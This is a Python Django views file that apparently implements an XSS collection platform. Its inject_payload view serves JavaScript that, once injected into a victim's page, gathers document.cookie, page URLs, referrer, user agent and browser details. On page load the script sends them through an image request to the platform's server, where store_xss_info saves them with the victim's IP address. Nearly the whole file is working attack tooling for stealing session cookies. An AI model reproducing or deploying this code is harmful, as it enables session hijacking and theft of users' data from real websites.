#!/usr/bin/env python
#coding:utf-8
"""
  Author:  Hysia --<hysia@huorui.net>
  Purpose: 
  Created: 12/21/13
"""
import json
from ast import literal_eval
from django.http import Http404, HttpResponse
from django.conf import settings
from django.template import RequestContext
from django.shortcuts import render_to_response
from django.contrib.auth.decorators import login_required

from models import XssData
from models import XssSnippers

@login_required
def index(request):
    '''XSS platform index page'''
    
    msg = 'xss index'

    return render_to_response('xss.html', {
            'msg': msg,
    }, context_instance=RequestContext(request))

def store_xss_info(request,uid):
    data = request.GET.get('i','')
    ip = request.META['HTTP_X_FORWARDED_FOR'] if 'HTTP_X_FORWARDED_FOR' in request.META else request.META['REMOTE_ADDR']
    useragent = request.META['HTTP_USER_AGENT']
    referer  = request.META['HTTP_REFERER']
    try:
        data_obj = literal_eval(data)
    except:
        data_obj = None
        
    if data_obj is None:
        #log error
        pass
    else:
        data_obj['uid'] = uid
        data_obj['ip'] = ip
        data_obj['ua'] = useragent if 'ua' not in data_obj else data_obj['ua']
        data_obj['referrer'] = referer if 'referrer' not in data_obj else data_obj['referrer']
        
        xssdata = XssData(**data_obj)
        xssdata.save()
    
    return HttpResponse('')

def inject_payload(request,uid):
    '''inject payload'''
    
    url = '%sxss/u/%s/s/' %(settings.SERVER_URL, uid)
    p_ua = 'escape(navigator.userAgent)'
    p_lang = 'navigator.language'
    p_platform = 'navigator.platform'
    p_referrer ='escape(document.referrer)'
    p_location = 'escape(window.location.href)'
    p_toplocation = 'escape(top.location.href)'
    p_cookies = 'escape(document.cookie)'
    p_domain = 'document.domain'
    p_title = 'document.title'
    p_screen = 'self.screen?screen.width+"x"+screen.height:""'
    p_opener = '(window.opener&&window.opener.location.href)?window.opener.location.href:""'
    p_flash = 'function(){var v="";if(window.ActiveXObject){var f=new window.ActiveXObject("ShockwaveFlash.ShockwaveFlash");if(f){v=f.GetVariable("$version");}}else if(navigator.plugins&&navigator.plugins.length>0){var f=navigator.plugins["Shockwave Flash"];if(f){v=f.description;}}return v;}()'
    
    data='''function j2s(o){var arr=[];var fmt=function(s){if(typeof s=='object'&&s!=null){return j2s(s)}else{return /^(string|number)$/.test(typeof s)?"'"+s+"'":s}};for (var i in o){arr.push("'"+i+"':"+fmt(o[i]))};return '{'+arr.join(',')+'}'}
    var d={};d.ua=%s;d.lang=%s;d.platform=%s;d.referrer=%s;d.location=%s;d.toplocation=%s;d.cookies=%s;d.domain=%s;d.title=%s;d.screen=%s;d.opener=%s;d.flash=%s;
    window.onload=function(){var i=j2s(d);new Image().src="%s?i="+i;};
    ''' %(p_ua, p_lang, p_platform, p_referrer, p_location, p_toplocation, p_cookies, p_domain, p_title, p_screen, p_opener, p_flash, url)

    return HttpResponse(data, mimetype="application/x-javascript")